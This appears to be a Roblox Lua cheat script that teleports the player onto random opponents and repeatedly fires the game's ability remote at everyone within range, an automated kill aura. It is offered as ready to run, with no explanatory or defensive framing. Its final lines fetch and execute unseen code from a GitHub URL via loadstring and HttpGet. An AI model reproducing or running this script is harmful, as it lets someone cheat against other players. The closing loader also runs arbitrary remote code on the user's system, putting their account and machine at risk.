local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local abilityRemote = ReplicatedStorage:WaitForChild("game_folder"):WaitForChild("remote"):WaitForChild("ability_remote")

local isRunning = true
local currentTarget = nil
local attackRange = 100

local function getAlivePlayers()
	local alive = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local char = plr.Character
			if char then
				local humanoid = char:FindFirstChild("Humanoid")
				if humanoid and humanoid.Health > 0 then
					table.insert(alive, plr)
				end
			end
		end
	end
	return alive
end

local function getRandomTarget()
	local alive = getAlivePlayers()
	if #alive == 0 then
		return nil
	end
	return alive[math.random(1, #alive)]
end

local function isTargetInRange(targetChar)
	if not targetChar then
		return false
	end
	
	local myChar = LocalPlayer.Character
	if not myChar then
		return false
	end
	
	local myRoot = myChar:FindFirstChild("HumanoidRootPart")
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	
	if not myRoot or not targetRoot then
		return false
	end
	
	local distance = (targetRoot.Position - myRoot.Position).Magnitude
	return distance <= attackRange
end

local function executeAttack(targetChar)
	if not targetChar then
		return
	end
	
	local humanoid = targetChar:FindFirstChild("Humanoid")
	if not humanoid or humanoid.Health <= 0 then
		return
	end
	
	if not isTargetInRange(targetChar) then
		return
	end
	
	local args = {
		"Powerplex",
		"M1",
		targetChar,
		"BoostCombatBlockBreaker",
		1,
		13275050218.687336
	}
	abilityRemote:FireServer(unpack(args))
end

local function teleportToTarget(targetChar)
	if not targetChar then
		return
	end
	
	local myChar = LocalPlayer.Character
	if not myChar then
		return
	end
	
	local myRoot = myChar:FindFirstChild("HumanoidRootPart")
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	
	if myRoot and targetRoot then
		myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
	end
end

local function checkTargetAlive()
	if not currentTarget then
		return false
	end
	
	local targetChar = currentTarget.Character
	if not targetChar then
		return false
	end
	
	local humanoid = targetChar:FindFirstChild("Humanoid")
	if not humanoid or humanoid.Health <= 0 then
		return false
	end
	
	return true
end

local function attackAllInRange()
	local myChar = LocalPlayer.Character
	if not myChar then
		return
	end
	
	local myRoot = myChar:FindFirstChild("HumanoidRootPart")
	if not myRoot then
		return
	end
	
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local targetChar = plr.Character
			if targetChar then
				local humanoid = targetChar:FindFirstChild("Humanoid")
				if humanoid and humanoid.Health > 0 then
					local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
					if targetRoot then
						local distance = (targetRoot.Position - myRoot.Position).Magnitude
						if distance <= attackRange then
							executeAttack(targetChar)
						end
					end
				end
			end
		end
	end
end

local function startAttack()
	if not currentTarget then
		currentTarget = getRandomTarget()
		if not currentTarget then
			return
		end
	end
	
	isRunning = true
	local attackTimer = 0
	
	RunService.Heartbeat:Connect(function()
		if not isRunning then
			return
		end
		
		if not checkTargetAlive() then
			currentTarget = getRandomTarget()
			if not currentTarget then
				return
			end
		end
		
		local targetChar = currentTarget.Character
		if not targetChar then
			currentTarget = getRandomTarget()
			return
		end
		
		local humanoid = targetChar:FindFirstChild("Humanoid")
		if not humanoid or humanoid.Health <= 0 then
			currentTarget = getRandomTarget()
			return
		end
		
		teleportToTarget(targetChar)
		
		attackTimer = attackTimer + RunService.Heartbeat:Wait()
		if attackTimer >= 0.3 then
			attackAllInRange()
			attackTimer = 0
		end
	end)
end

startAttack()

LocalPlayer.CharacterAdded:Connect(function()
	task.wait(0.5)
end)

task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NMCJSSB2/114514/refs/heads/main/%E8%93%9D%E7%89%99%E5%B0%8F%E6%B8%B8%E6%88%8F"))()
end)
